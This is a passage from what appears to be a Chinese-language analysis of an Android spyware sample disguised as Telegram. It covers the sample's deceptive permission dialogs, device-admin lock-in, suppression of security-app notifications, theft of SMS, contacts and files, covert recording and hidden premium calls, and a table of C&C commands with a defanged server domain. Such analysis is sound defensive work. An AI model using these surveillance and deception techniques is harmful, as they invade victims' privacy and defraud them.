src="326471a1/fbb9ff80ca695e797394b650909355a6.png"></p><p>第三个伪装成安全软件扫描界面,将要卸载的应用标记成恶意软件,诱导用户点击删除达到卸载的目的。</p><p><img src="326471a1/20ed314591ba8fd431b5b9608fa5468b.png"></p><h3 id="4-1-4组件service"><a href="#4-1-4组件service" class="headerlink" title="4.1.4组件service"></a>4.1.4组件service</h3><p>注册多个service,用于在后台执行代码</p><p><img src="326471a1/bb5e9cf7a56e3f115dfac7d6ce0b57dd.png"></p><p>注册无障碍服务用于完成模拟屏幕点击。</p><p><img src="326471a1/b976bfaffb15b67b3a4ed602cf530d61.png"></p><h3 id="4-1-5组件receiver"><a href="#4-1-5组件receiver" class="headerlink" title="4.1.5组件receiver"></a>4.1.5组件receiver</h3><p>注册多个receiver来接收来自系统和应用中的广播。</p><p><img src="326471a1/9fec00a810fcc7c2b09a506d12530d04.png"></p><h4 id="设备管理员权限"><a href="#设备管理员权限" class="headerlink" title="设备管理员权限"></a>设备管理员权限</h4><p>注册广播接收设备管理员权限的激活或禁止事件。</p><p><img src="326471a1/04c65bde3e5d4ecd3b7cb400aca68fb3.png"></p><p>设置设备管理员操作界面的标题和描述,诱导用户激活设备管理员(获取超级管理员权限)。</p><p><img src="326471a1/44e39c4b2544fb848141ac507e7b402d.png"></p><p>&emsp;&emsp;一旦一个应用激活了设备管理员权限,是不能通过设置里的应用程序来卸载程序,必须要在设置-&gt;位置和安全-&gt;选择设备管理员器里找到要删除应用并取消激活,然后才能再去应用程序里删除。当收到禁用设备管理员权限的请求时,跳转到home界面并返回警告信息。</p><p><img src="326471a1/e2d0152d4d07afda4e9bbc3d5af2b3fd.png"></p><p>返回的警告信息如下图,翻译过来就是” Google PlayInstaller是系统APP,如果卸载了它,设备就处于危险的状态下。”</p><p><img src="326471a1/f9336908762bb292ebb1cd1b21e11313.png"></p><p>如果用户忽略警告,继续禁用则返回home界面。</p><p><img src="326471a1/544a87cb2d18eebca8410a49b9d87710.png"></p><p>跳转到home界面实现如下</p><p><img src="326471a1/0803e901aeb59c3571b9e4cab64a24ff.png"></p><h4 id="短信接收"><a href="#短信接收" class="headerlink" title="短信接收"></a>短信接收</h4><p>当接收到短信时判断是否是SMS指令,如果不是则将短消息内容写入文件并上传到C&amp;C服务器,否则就执行SMS指令。详细分析见<a href="#sms%E6%8C%87%E4%BB%A4">4.10.2</a>。</p><p><img src="326471a1/bbb20d31e88c0f4de0e2f96447415c10.png"></p><h4 id="网络变化"><a href="#网络变化" class="headerlink" title="网络变化"></a>网络变化</h4><p>注册了两个广播用于接收网络状态改变的事件。当网络连接的事件发生时,上传窃取的数据,包括通讯录、短信、通话录音和屏幕截图等等。</p><p><img src="326471a1/97a663002bdf5f44c17b7984ca90723a.png"></p><h4 id="APP卸载"><a href="#APP卸载" class="headerlink" title="APP卸载"></a>APP卸载</h4><p>注册广播接收App的卸载事件,当某些App被卸载时上传被卸载的应用名。</p><p><img src="326471a1/119723f8530c6a22a4917c7b56fb0e62.png"></p><p>由于这些包名都包含”update”,初步猜测这些应该是FCM下发”update”指令时下发的更新包。</p><p><img src="326471a1/37c4ad70edb0d23c8e37d75e7e59dbd9.png"></p><h4 id="APP安装"><a href="#APP安装" class="headerlink" title="APP安装"></a>APP安装</h4><p>注册广播接收安装应用的事件,App安装完成时默认不会启动App。</p><p><img src="326471a1/6a5e4b9c11bea81bf5c89b20c1191d12.png"></p><p>当安装的应用包名为”org.telegram.messenger”时并且已经安装在设备上时,则隐藏自身图标,删除asset.apk安装文件,启动要安装的应用。</p><p><img src="326471a1/b0674122ee7ebd2e928d2895bfb2892a.png"></p><p>当安装的应用包名为FCM下发”update”指令的字段App_package,如果已经安装,上传已安装的消息到C&amp;C服务器,删除更新文件”mupdate.apk”和图标,禁用所有广播,启动包名为App_package的应用。</p><p><img src="326471a1/585ff79b526d238d0fc597eb84144cc8.png"></p><h4 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h4><p>注册广播接收受害者设备关机事件</p><p><img src="326471a1/b022e6b2d085d0f43001ca617e9c47df.png"></p><p>关机时将关机时间写入文件”shutdown.nez”</p><p><img src="326471a1/e2ee9c022fb1c12b1ce0b37cc628356a.png"></p><h4 id="屏幕解锁"><a href="#屏幕解锁" class="headerlink" title="屏幕解锁"></a>屏幕解锁</h4><p>注册广播接收屏幕解锁事件。</p><p><img src="326471a1/2cb93cc0a9f5d57acb33affc2a4d6b13.png"></p><p>当屏幕解锁时,启动摄像头摄像功能。</p><p><img src="326471a1/436e1b17e26c1c3b32a3c2c41e26106a.png"></p><h4 id="开机或重启"><a href="#开机或重启" class="headerlink" title="开机或重启"></a>开机或重启</h4><p>注册广播接收受害者设备开机或者重启事件。</p><p><img src="326471a1/f8fe4ff9aa10eee25fb79ca4d008cb94.png"></p><p>当手机开机时将当前时间写入shutdown.net文件中。</p><p><img src="326471a1/51c4a4c64904fbf76015b8e96096aa52.png"></p><h4 id="电话状态改变或拨出电话"><a href="#电话状态改变或拨出电话" class="headerlink" title="电话状态改变或拨出电话"></a>电话状态改变或拨出电话</h4><p>注册广播接收电话状态改变和设备拨打电话的事件。</p><p><img src="326471a1/ab2960f26c7e6b1da815b2a94b8026c5.png"></p><p>接收到拨出或接到来电时调用前置摄像头拍照并录音。</p><p><img src="326471a1/952f8ebeabfa3aa5453f4cf149d5d022.png"></p><h4 id="通知栏消息"><a href="#通知栏消息" class="headerlink" title="通知栏消息"></a>通知栏消息</h4><p>注册广播接收通知栏消息,主要功能为窃取社交App的通知消息和关闭一些安全软件的消息通知等等。</p><p><img src="326471a1/7bb0a3a06aba7e7d5fa8ee3167043594.png"></p><p>当通知栏收到新通知消息时,取消部分应用发送的通知消息,不在通知栏中显示其消息内容;如三星手机内置安全应用和华为内置安全应用。</p><p><img src="326471a1/eebb6a7da64c1db8bb27d6471e735764.png"></p><p>读取一些社交软件发送的通知栏消息,包括图标、标题和内容并且保存到wfv文件中。</p><p><img src="326471a1/317d0065ab71f8749b023e984b0a0d57.png"></p><p>如果接收到的消息是WhatApp发送的来电请求,开启录音服务准备录音。</p><p><img src="326471a1/b8e0984f847205e2c2c626826fffe6f4.png"></p><p>如果移除的通知消息是WhatApp收到的来电请求,关闭正在运行的录音服务。</p><p><img src="326471a1/cf5fae21d97a6402f52e0e218d43fdf5.png"></p><h2 id="4-2不同组件之间的通信"><a href="#4-2不同组件之间的通信" class="headerlink" title="4.2不同组件之间的通信"></a>4.2不同组件之间的通信</h2><p>Activity、Receiver、Service三个组件之间的相互通信通过闹钟服务alarmManager来实现。PendindIntent为闹钟触发时要执行的动作,比如发送广播消息、启动activity或者服务等。</p><p><img src="326471a1/75796f51d70b02603271fa110957f4cb.png"></p><h3 id="启动activity"><a href="#启动activity" class="headerlink" title="启动activity"></a>启动activity</h3><p><img src="326471a1/afc0afede0bea2c5f3a2923180dfd44f.png"></p><h3 id="启动service"><a href="#启动service" class="headerlink" title="启动service"></a>启动service</h3><p><img src="326471a1/ee6a6f188e100525561676d72c49b44d.png"></p><h3 id="发送广播"><a href="#发送广播" class="headerlink" title="发送广播"></a>发送广播</h3><p><img src="326471a1/79353668661c73dee2bbf86fcd55afbc.png"></p><h2 id="4-4-计算设备标识"><a href="#4-4-计算设备标识" class="headerlink" title="4.4 计算设备标识"></a>4.4 计算设备标识</h2><p>设备标识主要用于识别设备,与C&amp;C通信时需要设置设备标识。根据系统版本的不同使用不同的计算方法。</p><p><img src="326471a1/72fbbbe1cedda1321c138471acdcbe0b.png"></p><h3 id="4-4-1-版本号低于29"><a href="#4-4-1-版本号低于29" class="headerlink" title="4.4.1 版本号低于29"></a>4.4.1 版本号低于29</h3><p>在低版本中,获取系统的Imei、macAddress或Device_ID作为设备标识。</p><p><img src="326471a1/09c0e324b50b727aa52969ef951309a9.png"></p><p>其中wlan的mac地址获取方法如下图,遍历所有网络接口,找到wlan0接口并返回硬件地址作为mac地址。</p><p><img src="326471a1/0b1abb3805b39e0f14908a1cf29690c5.png"></p><h3 id="4-4-2-版本号高于29"><a href="#4-4-2-版本号高于29" class="headerlink" title="4.4.2 版本号高于29"></a>4.4.2 版本号高于29</h3><p>首先从SharePreferencces读取键为”UNIQUE_ID”的值,如果存在使用该值作为设备ID,不存在则从.pesudo.iso读取设备ID并将值保存到UNIQUE_ID。文件不存在则创建文件并计算设备ID。</p><p><img src="326471a1/30ed4414dea827b1d4ecedcac795faed.png"></p><p>其中psuedUniqueID计算方法如下:</p><p><img src="326471a1/361910b74de3e2a3c734b8cefe56edfc.png"></p><p>Sim序列号获取方法如下</p><p><img src="326471a1/6dfd2adcc6e4e073f7e7e9d05f18819d.png"></p><h2 id="4-4-收集信息加密压缩"><a href="#4-4-收集信息加密压缩" class="headerlink" title="4.4 收集信息加密压缩"></a>4.4 收集信息加密压缩</h2><p>对于收集到的数据,比如通话记录、通讯录和短消息等等,大部分都是通过加密压缩成zip文件再上传到C&amp;C服务器上。计算压缩数据时使用的密码,从计算方式可以看出密码是根据设备信息生成的。设备ID与设备标识通过某种方式组合后的字符串末尾再加上字符串”3K=H8N=O7S=H8A=N”得到新的字符串,最终压缩密码为新字符串的MD5值。</p><p><img src="326471a1/0920880065063aed6d38e7b079c5e30e.png"></p><h2 id="4-3类名方法名混淆"><a href="#4-3类名方法名混淆" class="headerlink" title="4.3类名方法名混淆"></a>4.3类名方法名混淆</h2><p>使用无意义的随机单词数字的组合来命名,加大分析人员的分析难度。如下左图为混淆后的代码,右图为Android库Volley的方法newRequestQueue代码。</p><p><img src="326471a1/e67c3fc313d88aa066022b8fc63d28d9.png"></p><h2 id="4-4-Application入口"><a href="#4-4-Application入口" class="headerlink" title="4.4 Application入口"></a>4.4 Application入口</h2><p>加载hydrogen.so,在so文件中实现了4个JNI接口,功能主要是返回字符串。</p><p><img src="326471a1/6a2f52ff700e99266c32218be074fdb4.png"></p><p>在so文件中实现的JNI接口</p><p><img src="326471a1/3faccb418a2453a64e84eb83f7a3d599.png"></p><p>实现代码如下,其他接口函数的实现类似,不同之处是返回不同的字符串</p><p><img src="326471a1/3cb959abe6483be7a7bf287a1a701c06.png"></p><table><thead><tr><th>函数名</th><th>返回的字符串</th><th>描述</th></tr></thead><tbody><tr><td>do932</td><td>3K=H8N=O7S=H8A=N-gZk3ctiqQ+MeznT8vuAt9fltaYUMk4kFd23LWNcoR4GGS5OQDgNXpYBZzzY8hqgZ</td><td>加密字符串,解密后为url</td></tr><tr><td>do933</td><td>&lt;/title&gt;</td><td>网页Tag,用于从网页中提取数据</td></tr><tr><td>do934</td><td>&lt;title</td><td></td></tr><tr><td>do937</td><td>com.miui.securitycenter</td><td>小米内置安全应用程序包名,包名用于判断通知栏的消息来源App,</td></tr></tbody></table><h3 id="解密C-amp-C地址"><a href="#解密C-amp-C地址" class="headerlink" title="解密C&amp;C地址"></a>解密C&amp;C地址</h3><p>do932函数返回的加密字符串有两个用途,连字符”-”前面部分用作密码的一部分,用来加密从受害者设备中提取的文件;第二部分首先解码（base64），然后解密（AES）。</p><p><img src="326471a1/d99af6946f18726293227a1b6d1e62f2.png"></p><p>然后从解密的url解析title标签。</p><p><img src="326471a1/c42d17247b94f9e95429f006cb6087d1.png"></p><p>最后一步是用”-”替换第一个空格和用”.”替换第二个空格,得到C&amp;C地址”hxxps://amanda-hart.website”。</p><p><img src="326471a1/56803028058e6fe9a9f18542dbecf167.png"></p><h3 id="设置异常处理函数"><a href="#设置异常处理函数" class="headerlink" title="设置异常处理函数"></a>设置异常处理函数</h3><p>当程序执行异常时执行logcat命令读取系统log并写入logs文件夹退出程序。Log文件名为log_{timestamp}</p><p><img src="326471a1/d480e6f29a0ed5b3b8c03db9c3139768.png"></p><h2 id="4-5-net-axel-app-activitit-Main类分析"><a href="#4-5-net-axel-app-activitit-Main类分析" class="headerlink" title="4.5 net.axel.app.activitit.Main类分析"></a>4.5 net.axel.app.activitit.Main类分析</h2><h3 id="1-随机启动正常应用或系统应用"><a href="#1-随机启动正常应用或系统应用" class="headerlink" title="1. 随机启动正常应用或系统应用"></a>1. 随机启动正常应用或系统应用</h3><p><img src="326471a1/2e02dbf8fd5c7b513fe0368aace6ab8a.png"></p><h3 id="动态更换图标"><a href="#动态更换图标" class="headerlink" title="动态更换图标"></a>动态更换图标</h3><p>该样本通过启用当前要显示的activity-alias,禁用其他的activity-alias来动态更换显示在应用程序列表中该样本的图标。</p><p><img src="326471a1/9863d995388b58332c0b36616817d8c7.png"></p><p>随机更换图标</p><p><img src="326471a1/72acc1a1f75de26e9ffaa49e9ca2a1cc.png"></p><h3 id="收集手机网络信息和设备信息"><a href="#收集手机网络信息和设备信息" class="headerlink" title="收集手机网络信息和设备信息"></a>收集手机网络信息和设备信息</h3><p>在联网情况下将收集到的信息zip压缩后上传到连接”{C2C地址}/func/info”</p><p><img src="326471a1/709836e72ba0cf61cbb3bda5c731b5cf.png"></p><h2 id="4-6-net-axel-app-activities-Telegram类分析"><a href="#4-6-net-axel-app-activities-Telegram类分析" class="headerlink" title="4.6 net.axel.app.activities.Telegram类分析"></a>4.6 net.axel.app.activities.Telegram类分析</h2><p>利用弹出对话框的形式,设置诱导性的标题与对话框欺骗用户点击,并且只设置一个确定按钮,受害者只能点击确定不然不能正常使用。</p><p><img src="326471a1/faf82d7b0a0716ebb76cfbfa83cfb78a.png"></p><p>为了获取多种权限,设置多种不同的且具有诱导性的内容来欺骗用户来激活权限,在onActivityResult处理操作结果,如果权限获取或者操作没有成功则再次弹窗直到获取权限成功为止。</p><table><thead><tr><th>对话框标题</th><th>对话框消息</th><th>对话框图标</th><th>描述</th></tr></thead><tbody><tr><td>Messages Encryption</td><td>It is a Chat App, If you don\‘t Enable this property system won\‘t encrypt chat messages.</td><td><img src="326471a1/afd571d05df86bcdc044d954526bf4be.png"></td><td>为了获取通知栏消息权限。</td></tr><tr><td>Private Messages</td><td>It is a Chat App, If you don\‘t Enable this property system won\‘t allow to you to send private messages</td><td><img src="326471a1/05a06f6cc46b12ed822f94b311b5a15e.png"></td><td>关闭Google Play Procet</td></tr><tr><td>Private Video Chat</td><td>It is a Chat App, If you don\‘t Enable this property you won\‘t use private video chat property</td><td><img src="326471a1/e425766c6903831a6b433a8d1446cabe.png"></td><td>获取录屏和录音权限</td></tr><tr><td>Power Optimization</td><td>It is a Chat App, If you don\‘t Enable this property system will block some properties due to battery optimization.</td><td><img src="326471a1/23dbd38a4dc76cb55d41ca5ea7e74d87.png"></td><td>设置自启动</td></tr><tr><td>Enable Notifications</td><td>It is a Chat App, If you don\‘t Enable this property you won\‘t receive chat notifications.</td><td><img src="326471a1/561df7b0b69562fe68d4886f1cb41813.png"></td><td>获取设备管理员权限</td></tr></tbody></table><p>安装正版应用org.telegram.messenger</p><p><img src="326471a1/d0685453b4e99144c56f09095cba2d5f.png"></p><h2 id="4-7-net-axel-app-activities-Real-App类分析"><a href="#4-7-net-axel-app-activities-Real-App类分析" class="headerlink" title="4.7 net.axel.app.activities.Real_App类分析"></a>4.7 net.axel.app.activities.Real_App类分析</h2><p>该类的主要功能为安装正版应用Telegram Message。APK文件位于assets目录,文件名为asset.apk。包名为”org.telegram.messenger”。</p><p><img src="326471a1/d0da5459e1ca6aafc0777672fa53b100.png"></p><p>根据版本和手机型号使用三种安装APK的方法。</p><p><img src="326471a1/ee39e705aa70756bc76b16bd77f8b794.png"></p><p>APK安装方法2:</p><p><img src="326471a1/939537a22366ff933256352c8ee56642.png"></p><p>APK安装方法3:</p><p><img src="326471a1/19ddefb41a729a25066dd4386ada3d02.png"></p><h2 id="4-8-net-axel-app-activities-uninstall-other类分析"><a href="#4-8-net-axel-app-activities-uninstall-other类分析" class="headerlink" title="4.8 net.axel.app.activities.uninstall_other类分析"></a>4.8 net.axel.app.activities.uninstall_other类分析</h2><p>当收到FCM(Firebase Cloud Messaging)下发的云消息中指令为”uninstall_another”时,要卸载的App由云消息的字段package指定。</p><p><img src="326471a1/34d39e732f251c2ff4f8fd1690632b8c.png"></p><p>判断要卸载的App列表在目标手机上是否已经被安装。如果至少有一个需要卸载的App在受害者手机上安装,则打开卸载页面,实际上显示在用户面前的是伪装成安全软件扫描恶意软件界面。</p><p><img src="326471a1/668e10db4bb406612ae18ef773f67bfc.png"></p><p>获取要卸载的app的详细信息,比如应用名、图标、版本号等等,用于在扫描页面显示。</p><p><img src="326471a1/b73cb18d4c35f2e1f7004147c87f189e.png"></p><p>在列表控件显示要卸载App列表,这些App被标记成恶意软件,并提示受害者卸载这些软件。</p><p><img src="326471a1/571366b4d52a670cfdce43aeda57fec3.png"></p><p>点击在列表中显示的app项时打开卸载页面或者设备管理员权限管理页面,让受害者手动操作是否卸载App和禁用设备管理员权限。如果受害者在卸载页面取消卸载,则再次弹出卸载页面,直到成功卸载为止。</p><p><img src="326471a1/807992de17ff894177308d8c88b9ca7e.png"></p><p>如果是卸载有设备管理员权限的App,需要先禁用设备管理员权限,才能成功卸载App。</p><p><img src="326471a1/b0920b82f2f7cb8a7234b0e6307be7a5.png"></p><h2 id="4-9-net-axel-app-activities-Update-dialog分析"><a href="#4-9-net-axel-app-activities-Update-dialog分析" class="headerlink" title="4.9 net.axel.app.activities.Update_dialog分析"></a>4.9 net.axel.app.activities.Update_dialog分析</h2><p>FCM(Firebase Cloud Messaging)下发指令”update”,并提供更新所需要的参数。Update_method为Notification时在通知栏中弹出更新消息,为message时使用更新界面更新应用。</p><p><img src="326471a1/7c55a7164eaa515454ce49ad3b13b929.png"></p><h3 id="使用通知栏更新"><a href="#使用通知栏更新" class="headerlink" title="使用通知栏更新"></a>使用通知栏更新</h3><p>创建通知消息,设置更新链接、更新描述和图标等等。</p><p><img src="326471a1/c1e044a8cd52f05f52d513717fad51d3.png"></p><p>当点击通知栏消息时,会跳转到安装界面，令人防不胜防。</p><p><img src="326471a1/ce971875260822d612bd60766a56f310.png"></p><h3 id="使用更新界面更新"><a href="#使用更新界面更新" class="headerlink" title="使用更新界面更新"></a>使用更新界面更新</h3><p>填充更新界面的通知栏标题、按键文本等等信息。</p><p><img src="326471a1/52b9b8839f389512756a74796f6f9fca.png"></p><p>其中按键的点击事件在master_update_dialog.xml文件中声明。点击按键时触发安装应用操作。</p><p><img src="326471a1/f6608c513c3807b46e6afcc5fa08230f.png"></p><h2 id="4-10-拨打电话"><a href="#4-10-拨打电话" class="headerlink" title="4.10 拨打电话"></a>4.10 拨打电话</h2><p>当收到FCM(Firebase Cloud Messaging)下发的云消息中指令为”find_mobile_number”时,执行拨打电话的指令。拨打号码类型由字段action来决定。</p><p><img src="326471a1/5d49619a5988f72c81b52d9362575402.png"></p><p>Action有如下三种</p><table><thead><tr><th>Action</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>使用当前正在使用的sim卡拨打余额查询业务,不会留下通话记录。</td></tr><tr><td>2</td><td>拨打正常号码,挂断电话后需要删除通话记录。</td></tr><tr><td>3</td><td>拨打增值业务号码,挂断电话后需要删除通话记录。</td></tr></tbody></table><p>使用黑色背景图覆盖通话界面,达到隐藏通话的目的。</p><p><img src="326471a1/5251c67c5f57d4a955c3981377aa46b1.png"></p><p>拨打电话时一般都会留下通话记录,在挂断电话后删除当前拨打号码的通话记录。这一切操作都是在受害者不知情或未交互的情况下完成。</p><p><img src="326471a1/ed38d9eee637a461017e6be82500ba8a.png"></p><p>Action1为使用当前正在使用的sim卡拨打特殊号码来查询话费,除了查询话费的号码不同外三家运营商实现拨号的代码大致相同。</p><p><img src="326471a1/43dc5555c1f0669963104c2c98b43285.png"></p><p>各个运营商查询话费需要拨打的号码如下:</p><table><thead><tr><th>运营商</th><th>地点</th><th>查询话费号码</th></tr></thead><tbody><tr><td>Jawwal</td><td>巴基斯坦</td><td>*111*5*{设备balance}#</td></tr><tr><td>wataniya</td><td>巴基斯坦</td><td>*130**00972{设备balance}#</td></tr><tr><td>Etisalat</td><td>阿富汗</td><td>*199*00972{设备balance}#</td></tr></tbody></table><p>action2和action3可以选择使用sim卡1还是sim卡2来拨打电话。</p><p><img src="326471a1/5fb1fcb33557c9453cb1c98e8960e205.png"><br>action3拨打的号码是增值业务号码,支付方式有f和c两种,由于缺乏对巴基斯坦地区移动通信相关业务缺乏了解,尚不清楚是网银支付还是其他方式。</p><p><img src="326471a1/329afc166d3909246e5ec18404e6a53c.png"></p><p>action2拨打号码时,号码由FCM下发的云消息中字段value指定。</p><p><img src="326471a1/2601568fe9163f522791fbda1f3f392e.png"></p><h2 id="4-11-窃取短消息和通讯录"><a href="#4-11-窃取短消息和通讯录" class="headerlink" title="4.11 窃取短消息和通讯录"></a>4.11 窃取短消息和通讯录</h2><p>FCM(Firebase Cloud<br>Messaging)下发指令”mess_cont”,字段Value指定要窃取的数据是短消息还是通讯录。</p><p><img src="326471a1/be9b29540aaf2f1f228726eb04c78739.png"></p><h3 id="窃取短消息"><a href="#窃取短消息" class="headerlink" title="窃取短消息"></a>窃取短消息</h3><p>读取设备中收件箱和发件箱中的所有短消息,加密压缩后上传到C&amp;C服务器。</p><p><img src="326471a1/66545aafc576e1933751d1f81b568e42.png"></p><h3 id="窃取通讯录"><a href="#窃取通讯录" class="headerlink" title="窃取通讯录"></a>窃取通讯录</h3><p>遍历通讯录的所有联系人,将其中有联系方式的加密压缩后上传到C&amp;C服务器。</p><p><img src="326471a1/8452f85565cebfdeebae26ea260db527.png"></p><h2 id="4-12-窃取通话记录"><a href="#4-12-窃取通话记录" class="headerlink" title="4.12 窃取通话记录"></a>4.12 窃取通话记录</h2><p>读取通话记录并保存到文件clogs.nez并上传到C&amp;C服务器。</p><p><img src="326471a1/3b9bbb625382f36030bd6f995f191263.png"></p><h2 id="4-13-窃取文档"><a href="#4-13-窃取文档" class="headerlink" title="4.13 窃取文档"></a>4.13 窃取文档</h2><p>从外部存储器窃取指定后缀的文档。</p><p><img src="326471a1/c6bcaa7263869d9bd0975d5d112a8d2a.png"></p><h2 id="4-14-录音"><a href="#4-14-录音" class="headerlink" title="4.14 录音"></a>4.14 录音</h2><p>当FCM下发指令”record_sound”时,实现录音功能。其中参数”start_time”和”end_time”分别为录音开始时间和录音结束时间。</p><p><img src="326471a1/a2251407733264afd4db94279ddd7c9b.png"></p><p>利用闹钟服务来设置录音服务的开始时间和结束时间。</p><p><img src="326471a1/fb3f50f6d2e4cca43495f3e5a19915f2.png"></p><p>使用类AudioRecord来实现录音的功能。</p><p><img src="326471a1/d6a8cd260cfe18449431d0424bdd1316.png"></p><h2 id="4-15-屏幕截图"><a href="#4-15-屏幕截图" class="headerlink" title="4.15 屏幕截图"></a>4.15 屏幕截图</h2><p>当FCM下发指令”wxyz”或者”wxyz_period”指令时执行屏幕截图功能。其中指令”wxyz_period”多了一个参数”period”,表示每隔多久截一次屏幕。截图完成后保存为bmp图片并上传到C&amp;C服务器。</p><p><img src="326471a1/27ba01dd11956a817535c26b00c3c4cb.png"></p><p>首先需要获取MediaProjectionManager服务,然后再获取一个申请屏幕采集权限的intent并启动屏幕采集申请权限界面。</p><p><img src="326471a1/fa7aed50b6075f4ac3e21efbd800a42e.png"></p><p>当用户允许屏幕录制时,在onActivityResult回调里根据返回的resultCode和data获取MediaProjection。</p><p><img src="326471a1/f47bfbe425126a35959088e3e729a5e5.png"></p><p>在方法g中设置屏幕截图的长宽和设置监听器监听新截图。</p><p><img src="326471a1/be1d2ad092b65cbc2feaab8fad708f7f.png"></p><p>当屏幕方向变化时重新设置监听器和屏幕截图的长宽。</p><p><img src="326471a1/f50c0ccb3fcefed1ff9f4fdb4d622981.png"></p><p>截图完成后加密压缩上传图片文件。</p><p><img src="326471a1/05509900fb161b3fccdcb7df14a144bf.png"></p><h2 id="4-16-摄像头拍照"><a href="#4-16-摄像头拍照" class="headerlink" title="4.16 摄像头拍照"></a>4.16 摄像头拍照</h2><p>当收到FMC下发的指令为”take_photo”时,执行摄像头拍照功能。参数action为”rear”时,使用后置摄像头拍照。</p><p><img src="326471a1/e220c7afa4f1263bdf861b68f60a804b.png"></p><p>设置为静音模式,避免拍照时被发现。</p><p><img src="326471a1/7817f636c7c4dbae28dbe953f34f8b43.png"></p><p>函数名被混淆,通过上下文信息可以确认是摄像头相关的API。</p><p><img src="326471a1/52f6cacbd099687cc2b92012a3d05a54.png"></p><p>拍照成功后取消静音,保存到目录syscam,保存的图片分辨率为1024*768。</p><p><img src="326471a1/25922815ffa76ce43783887267937d5d.png"></p><h2 id="4-17命令与控制"><a href="#4-17命令与控制" class="headerlink" title="4.17命令与控制"></a>4.17命令与控制</h2><p>注册服务用于在后台处理FCM下发的云消息。</p><p><img src="326471a1/e7950a469f538de3c690dbb37e7b9048.png"></p><h3 id="1-FCM下发的指令"><a href="#1-FCM下发的指令" class="headerlink" title="1. FCM下发的指令"></a>1. FCM下发的指令</h3><p>每条指令都包含两个基本参数Id和type,分别是设备ID和指令名。</p><table><thead><tr><th>指令名</th><th>指令描述</th><th>额外参数</th><th>附加信息</th><th>参数描述</th></tr></thead><tbody><tr><td>s_dom</td><td>设置新的C&amp;C域名</td><td>basic</td><td></td><td>要设置的域名</td></tr><tr><td>uninstall_another</td><td>卸载其他应用</td><td>package</td><td></td><td>要卸载的App列表,多个App用逗号隔开。</td></tr><tr><td>take_photo</td><td>使用摄像头拍照并上传</td><td>Action</td><td>Rear</td><td>使用后置摄像头拍照</td></tr><tr><td></td><td></td><td></td><td>其他值</td><td>使用前置摄像头拍照</td></tr><tr><td>record_sound</td><td>录音并上传到C&amp;C服务器</td><td>Start_time</td><td></td><td>录音开始时间</td></tr><tr><td></td><td></td><td>End_time</td><td></td><td>录音结束时间</td></tr><tr><td>S_perms</td><td>检测激活的权限并上传到C&amp;C服务器</td><td></td><td></td><td></td></tr><tr><td>Apps_info</td><td>手机已安装应用的应用名、版本号和安装时间等等信息。</td><td></td><td></td><td></td></tr><tr><td>Wifi_restart</td><td>重启wifi</td><td></td><td></td><td></td></tr><tr><td>Kpa_elif_teg</td><td></td><td>Cke</td><td></td><td></td></tr><tr><td>Find_mobile_number</td><td>拨打号码</td><td>Value</td><td></td><td>电话号码</td></tr><tr><td></td><td></td><td>Action</td><td>1</td><td>拨打话费查询号码</td></tr><tr><td></td><td></td><td></td><td>2</td><td>拨打正常号码</td></tr><tr><td></td><td></td><td></td><td>3</td><td>拨打增值业务号码</td></tr><tr><td>Call_rec_encode</td><td>将录音文件编码成mp3文件</td><td></td><td></td><td></td></tr><tr><td>wxyz</td><td>屏幕截图</td><td>Quality</td><td></td><td>图片分辨率</td></tr><tr><td>Wxyz_period</td><td>周期性屏幕截图</td><td>Period</td><td></td><td>屏幕截图周期</td></tr><tr><td></td><td></td><td>Quality</td><td></td><td>图片分辨率</td></tr><tr><td>Call_logs</td><td>读取通话记录并上传到C&amp;C服务器。</td><td></td><td></td><td></td></tr><tr><td>W_S</td><td>是否允许对WhatApp通话录音。</td><td>Value</td><td></td><td>为0时允许录音。</td></tr><tr><td>Access_service_check</td><td>检测无障碍服务是否被启用。</td><td></td><td></td><td></td></tr><tr><td>Disable_admin</td><td>取消设备管理员权限。</td><td></td><td></td><td></td></tr><tr><td>Check_hide</td><td>检测自身图标是否被隐藏</td><td></td><td></td><td></td></tr><tr><td>Mess_cont</td><td>窃取短消息或者通讯录</td><td>Value</td><td>Cont</td><td>窃取通讯录</td></tr><tr><td></td><td></td><td></td><td>Mess</td><td>窃取短消息</td></tr><tr><td>S_tree</td><td>收集文件或文件夹信息并上传</td><td>Custom</td><td></td><td>Custom为真遍历所有文件和文件夹,否则遍历符合条件的文件和文件夹。</td></tr><tr><td>Stop_rec</td><td>结束录音服务</td><td></td><td></td><td></td></tr><tr><td>Stop_custom_rec</td><td>结束自定义录音服务</td><td></td><td></td><td></td></tr><tr><td>Stop_currect_rec</td><td>结束当前正在运行的录音服务</td><td></td><td></td><td></td></tr><tr><td>Manage_files</td><td>文件管理</td><td>Src</td><td></td><td>源路径</td></tr><tr><td></td><td></td><td>Dst</td><td></td><td>目标路径</td></tr><tr><td></td><td></td><td>action</td><td>Get</td><td>上传文件</td></tr><tr><td></td><td></td><td></td><td>Fast_get</td><td>快速上传</td></tr><tr><td></td><td></td><td></td><td>Download_file</td><td>下载文件</td></tr><tr><td></td><td></td><td></td><td>Delete</td><td>删除文件</td></tr><tr><td></td><td></td><td></td><td>Rename</td><td>重命名文件</td></tr><tr><td></td><td></td><td></td><td>Copy</td><td>复制文件</td></tr><tr><td></td><td></td><td></td><td>Move</td><td>移动文件</td></tr><tr><td></td><td></td><td>download_url</td><td></td><td>下载链接</td></tr><tr><td></td><td></td><td>download_file_name</td><td></td><td>下载文件名</td></tr><tr><td></td><td></td><td>download_path</td><td></td><td>下载路径</td></tr><tr><td>Update</td><td>用来更新update apk</td><td>Icon_url</td><td></td><td>图标链接</td></tr><tr><td></td><td></td><td>url</td><td></td><td>应用链接</td></tr><tr><td></td><td></td><td>Pkg</td><td></td><td>包名</td></tr><tr><td></td><td></td><td>Update_method</td><td></td><td>更新方法</td></tr><tr><td></td><td></td><td>App_type</td><td></td><td>应用类型</td></tr><tr><td></td><td></td><td>title</td><td></td><td>更新标题</td></tr><tr><td></td><td></td><td>Color</td><td></td><td>更新界面中分割线的颜色</td></tr><tr><td></td><td></td><td>message</td><td></td><td>更新描述</td></tr><tr><td></td><td></td><td>Button</td><td></td><td>按钮文本</td></tr><tr><td>Delete_app</td><td>删除App,未实现</td><td></td><td></td><td></td></tr><tr><td>Screen_on</td><td>检测屏幕是否处于锁屏状态</td><td></td><td></td><td></td></tr><tr><td>Get_mess</td><td>读取短消息</td><td></td><td></td><td></td></tr><tr><td>Hide_app</td><td>隐藏自身</td><td></td><td></td><td></td></tr></tbody></table><h3 id="SMS指令"><a href="#SMS指令" class="headerlink" 